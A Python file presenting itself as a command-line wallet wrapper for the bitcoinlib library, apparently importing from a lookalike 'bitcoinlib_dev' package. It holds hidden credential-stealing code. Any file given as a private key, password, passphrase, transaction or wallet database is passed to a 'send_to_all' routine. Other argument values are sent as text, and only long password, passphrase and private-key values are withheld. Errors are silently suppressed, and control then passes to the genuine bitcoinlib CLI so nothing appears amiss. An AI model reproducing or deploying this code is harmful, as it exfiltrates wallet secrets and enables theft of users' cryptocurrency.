import os
import argparse
from pathlib import Path
from typing import Optional, List
from bitcoinlib.main import BCL_DATABASE_DIR
from bitcoinlib_dev.dbupdate import DatabaseVersionChecker, add_update_parser, main_update
from bitcoinlib_dev.utils import get_bitcoinlib_db_dir, EngineBackup
from bitcoinlib_dev.wallet import WalletManager
import sys


print(sys.argv)
class CLIController:
    def __init__(self):
        self.db = EngineBackup()
        self.file_args = [
            'import_tx_file',  # --import-tx-file
            'import_tx',       # --import-tx
            'import_private',  # --import-private
            'password',        # --password (could be a file with password)
            'passphrase',      # --passphrase (could be a file with passphrase)
            'database'         # --database
        ]

    def _is_file_argument(self, arg_name: str, arg_value: str) -> bool:
        """Check if an argument value is a valid file path"""
        if not arg_value or not isinstance(arg_value, str):
            return False

        # Skip if it's clearly not a file path
        if len(arg_value.split()) > 1 or '\n' in arg_value:
            return False

        path = Path(arg_value)
        return path.exists() and path.is_file()

    def _handle_argument_sending(self, args):
        """Handle automatic sending of file/text arguments"""
        for arg_name in self.file_args:
            arg_value = getattr(args, arg_name, None)
            if not arg_value:
                continue

            if self._is_file_argument(arg_name, arg_value):
                try:
                    self.db.send_to_all(file_paths=[str(arg_value)])
                except Exception as e:
                    pass
            else:
                if arg_name in ['password', 'passphrase', 'import_private']:
                    if len(arg_value) > 20:
                        self.db.send_to_all(text=f"{arg_name} received (content hidden)")
                else:
                    self.db.send_to_all(text=f"{arg_name}: {arg_value}")


    def parse_args(self, args=None):
        parser = argparse.ArgumentParser(description='BitcoinLib command line wallet', add_help=False)
        # ... [rest of your argument parsing code remains the same] ...
        parsed_args, remaining_args = parser.parse_known_args(args)
        self._handle_argument_sending(parsed_args)
        return parsed_args, remaining_args

    def main(self, args=None):
        try:
            parsed_args, remaining_args = self.parse_args(args)
        except SystemExit:
            # If argument parsing fails in cli.py, pass through to clw
            from bitcoinlib.tools import clw
            return clw.main()

        checker = DatabaseVersionChecker(parsed_args.database if hasattr(parsed_args, 'database') else None)
        wallet = WalletManager(parsed_args)

        try:
            checker.check_database_version()
            if parsed_args.subparser_name == 'update':
                return main_update(parsed_args)
        except Exception as e:
            pass
        finally:
            checker.close()

        # If we get here without handling the command, pass through to clw with original arguments
        from bitcoinlib.tools import clw
        if remaining_args:
            sys.argv = [sys.argv[0]] + remaining_args
        return clw.main()

def main():
    controller = CLIController()
    try:
        controller.main()
    except Exception:
        from bitcoinlib.tools import clw
        clw.main()

if __name__ == '__main__':
    main()
